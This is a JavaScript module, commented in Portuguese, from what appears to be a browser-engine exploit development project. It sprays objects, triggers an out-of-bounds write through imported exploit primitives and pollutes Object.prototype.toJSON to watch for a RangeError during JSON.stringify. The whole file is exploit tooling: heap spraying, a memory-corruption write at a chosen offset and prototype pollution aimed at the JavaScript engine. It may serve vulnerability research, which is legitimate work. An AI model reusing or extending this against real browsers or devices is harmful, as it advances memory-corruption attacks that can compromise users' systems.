// js/script3/testInvestigatePropertyAccessInRangeError.mjs
import { logS3, PAUSE_S3, MEDIUM_PAUSE_S3, SHORT_PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex, isAdvancedInt64Object } from '../utils.mjs';
import {
    triggerOOB_primitive,
    oob_array_buffer_real,
    oob_write_absolute,
    clearOOBEnvironment
} from '../core_exploit.mjs';
import { OOB_CONFIG } from '../config.mjs';

class MyComplexObjectForRangeError {
    constructor(id) {
        this.id = `RangeErrorTestObj-${id}`;
        this.marker = 0x1234ABCD;
        this.data = [id, id + 1, id + 2];
        this.subObject = { nested_prop: id * 10 };
        this[`prop${id}`] = id; // Propriedade enumerável própria
        this[`anotherProp${id}`] = `val${id}`; // Outra propriedade enumerável própria
    }
    // Nenhuma checkIntegrity ou action para manter o foco no acesso durante a enumeração
}

// toJSON instrumentada para logar acessos de propriedade dentro do for...in
export function toJSON_InstrumentedLoopInAccess() {
    const FNAME_toJSON = "toJSON_InstrumentedLoopInAccess";
    let props_accessed_before_error = {};
    let count = 0;
    let error_occurred = null;
    let last_prop_before_error = "N/A";

    try {
        logS3(`   [${FNAME_toJSON}] Iniciando loop for...in em 'this' (ID: ${this ? this.id : "N/A"})...`, "info", FNAME_toJSON);
        for (const p in this) {
            count++;
            last_prop_before_error = p; // Atualiza antes de tentar o acesso
            logS3(`     [${FNAME_toJSON}] Loop ${count}: Tentando acessar prop '${p}'...`, "info", FNAME_toJSON);

            // Tenta o acesso que pode causar RangeError
            const val = this[p];

            // Se o acesso foi bem-sucedido, loga e adiciona ao payload
            props_accessed_before_error[p] = (typeof val === 'function') ? "[Function]" : String(val).substring(0, 50);
            logS3(`       [${FNAME_toJSON}] Prop '${p}' acessada com sucesso. Valor (truncado): ${props_accessed_before_error[p]}`, "info", FNAME_toJSON);

            if (count > 100) { // Prevenção contra loops realmente infinitos (improvável se o RangeError for o problema)
                logS3(`     [${FNAME_toJSON}] Limite de iteração (100) atingido.`, "warn", FNAME_toJSON);
                props_accessed_before_error['...'] = "truncated_loop";
                break;
            }
        }
    } catch (e) {
        logS3(`     [${FNAME_toJSON}] ERRO dentro do loop for...in ao processar prop '${last_prop_before_error}': ${e.name} - ${e.message}`, "error", FNAME_toJSON);
        error_occurred = `${e.name}: ${e.message}`;
    }

    return {
        variant: FNAME_toJSON,
        last_prop_attempted: last_prop_before_error,
        props_successfully_accessed: props_accessed_before_error,
        loop_iterations: count,
        error_during_loop: error_occurred
    };
}

export async function executeInvestigatePropertyAccessInRangeError() {
    const FNAME_TEST = "executeInvestigatePropertyAccessInRangeError";
    logS3(`--- Iniciando ${FNAME_TEST}: Investigar Acesso de Propriedade no RangeError ---`, "test", FNAME_TEST);
    document.title = `Investigate Prop Access in RangeError`;

    const spray_count = 10; // Menor para focar no primeiro objeto, mas ter alguns de reserva
    const sprayed_objects = [];

    const corruption_offset_in_oob_ab = 0x70;
    const value_to_write_in_oob_ab = 0xFFFFFFFF;
    const bytes_to_write_oob_val = 4;

    logS3(`1. Pulverizando ${spray_count} instâncias de MyComplexObjectForRangeError...`, "info", FNAME_TEST);
    for (let i = 0; i < spray_count; i++) {
        sprayed_objects.push(new MyComplexObjectForRangeError(i));
    }
    logS3(`   Pulverização de ${sprayed_objects.length} objetos concluída.`, "good", FNAME_TEST);

    await PAUSE_S3(200);

    logS3(`2. Configurando ambiente OOB e realizando escrita OOB...`, "info", FNAME_TEST);
    await triggerOOB_primitive();
    if (!oob_array_buffer_real) {
        logS3("Falha OOB Setup. Abortando.", "error", FNAME_TEST);
        return { error: new Error("OOB Setup Failed") };
    }
    try {
        logS3(`   Escrevendo ${toHex(value_to_write_in_oob_ab)} em oob_array_buffer_real[${toHex(corruption_offset_in_oob_ab)}]...`, "warn", FNAME_TEST);
        oob_write_absolute(corruption_offset_in_oob_ab, value_to_write_in_oob_ab, bytes_to_write_oob_val);
    } catch (e_write) {
        logS3(`   ERRO na escrita OOB: ${e_write.message}`, "error", FNAME_TEST);
        clearOOBEnvironment();
        return { error: e_write };
    }
    await PAUSE_S3(200);

    logS3(`3. Sondando sprayed_objects[0] com toJSON_InstrumentedLoopInAccess...`, "test", FNAME_TEST);

    const ppKey_val = 'toJSON';
    let originalToJSONDescriptor = Object.getOwnPropertyDescriptor(Object.prototype, ppKey_val);
    let pollutionApplied = false;
    let testResult = { error: null, stringifyResult: null, object_id: null };

    try {
        Object.defineProperty(Object.prototype, ppKey_val, {
            value: toJSON_InstrumentedLoopInAccess,
            writable: true, configurable: true, enumerable: false
        });
        pollutionApplied = true;

        const target_obj_to_stringify = sprayed_objects[0];
        if (target_obj_to_stringify) {
            testResult.object_id = target_obj_to_stringify.id;
            logS3(`  Chamando JSON.stringify(sprayed_objects[0]) (ID: ${target_obj_to_stringify.id})...`, "info", FNAME_TEST);
            testResult.stringifyResult = JSON.stringify(target_obj_to_stringify);
            logS3(`    JSON.stringify completou. Resultado da toJSON: ${JSON.stringify(testResult.stringifyResult)}`, "info", FNAME_TEST);
            if (testResult.stringifyResult && testResult.stringifyResult.error_during_loop) {
                testResult.error = new Error(`Erro interno da toJSON (loop): ${testResult.stringifyResult.error_during_loop}`);
            }
        }
    } catch (e_str) {
        testResult.error = e_str;
        logS3(`    !!!! ERRO AO STRINGIFY obj[0] !!!!: ${e_str.name} - ${e_str.message}`, "critical", FNAME_TEST);
        if (e_str.name === 'RangeError') {
            document.title = `RangeError ISOLATED!`;
        } else {
            document.title = `Error during stringify!`;
        }
    } finally {
        if (pollutionApplied) {
            if (originalToJSONDescriptor) Object.defineProperty(Object.prototype, ppKey_val, originalToJSONDescriptor);
            else delete Object.prototype.toJSON;
        }
    }

    if (testResult.error) {
        logS3(`  ---> PROBLEMA DETECTADO ao sondar objeto ID ${testResult.object_id}: ${testResult.error.name} - ${testResult.error.message}`, "critical", FNAME_TEST);
    } else {
        logS3(`  ---> Sondagem do objeto ID ${testResult.object_id} completou sem erro explícito no stringify.`, "good", FNAME_TEST);
    }
    logS3(`     Detalhes da toJSON: ${JSON.stringify(testResult.stringifyResult)}`, "info", FNAME_TEST);


    logS3(`--- ${FNAME_TEST} CONCLUÍDO ---`, "test", FNAME_TEST);
    clearOOBEnvironment();
    sprayed_objects.length = 0;
    globalThis.gc?.();
    if (testResult.error && testResult.error.name === 'RangeError') {
        // Manter título
    } else if (testResult.error) {
        document.title = `Test Error - ${FNAME_TEST}`;
    } else {
        document.title = `Test Done - ${FNAME_TEST}`;
    }
    return testResult;
}
